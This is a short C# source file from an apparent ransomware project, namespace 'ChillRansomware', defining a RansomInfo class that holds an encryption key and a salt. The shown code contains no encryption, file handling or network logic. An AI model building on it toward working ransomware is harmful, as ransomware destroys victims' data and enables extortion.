using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ChillRansomware
{
    class RansomInfo
    {
        public string EncryptionKey { get; set; }
        public byte[] Salt { get; set; }
        public RansomInfo()
        {

        }
    }
}
